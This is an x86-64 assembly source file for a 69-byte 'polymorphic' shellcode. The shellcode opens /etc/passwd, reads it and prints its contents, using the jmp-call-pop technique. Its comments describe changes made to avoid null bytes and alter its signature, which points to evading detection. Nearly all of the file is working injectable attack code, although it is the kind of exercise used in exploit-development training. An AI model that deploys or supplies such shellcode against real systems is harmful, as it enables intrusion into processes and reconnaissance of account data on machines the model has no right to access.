; Modified Polymorphic code
; Read /etc/passwd
; Shellcode size 69 bytes

global _start

section .text

_start:
jmp _push_filename

_readfile:

                                        ; syscall open file
        pop rdi                         ; pop path value        ; Modified to remove the A character and xor
        mov al, 2
        xor rsi, rsi                    ; set O_RDONLY flag
        syscall

                                        ; syscall read file
        sub sp, 0xfff
        lea rsi, [rsp]
        mov rdi, rax
        xor rdx, rdx
        push rdx                        ; Modified to change code and optimize
        pop rax
        mov dx, 0xfff; size to read
        syscall

                                        ; syscall write to stdout
        mov dil, 1 ; set stdout fd = 1  ; optimized by removing xor instruction
        mov rdx, rax
        xor rax, rax
        mov al, 1
        syscall

                                        ; syscall exit
        xor rax, rax
        add al, 60
        syscall

_push_filename:

        call _readfile
        path: db "/etc/passwd"          ; file name will be pushed inside stack
